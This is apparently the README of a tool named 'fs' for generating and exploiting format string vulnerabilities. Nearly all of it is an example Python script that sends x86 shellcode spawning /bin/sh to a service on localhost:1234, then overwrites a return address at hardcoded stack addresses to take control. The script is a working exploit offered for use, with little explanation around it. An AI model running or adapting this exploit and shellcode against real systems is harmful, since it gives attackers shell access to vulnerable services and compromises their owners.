# fs
Use this script to generate and exploit format string with ease.

```python
#!/usr/bin/python
# coding=utf-8


from fsef import RemoteFsef


shellcode = "\x1c\xa8\x04\x08\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46"
shellcode += "\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
shellcode += "\x69\x89\xe3\x89\xd1\xcd\x80"


def handle_login(cls):
    cls.recv()
    cls.send("A"*10).recv()
    cls.send(shellcode).recv()


def trigger_exploit(cls):
    cls.send("quit").recv()


def exploit(action="dump"):
    fsef = RemoteFsef("localhost", 1234, action, null=True)
    if action == "exploit":
        buffer = 0xbffffabc
        retaddr = 0xbffffadc
        offset = 9
        fsef.pwn(handle_login, trigger_exploit, retaddr, buffer, offset)
    else:
        fsef.pwn(handle_login)


if __name__ == '__main__':
    exploit("dump")
    exploit("exploit")
```
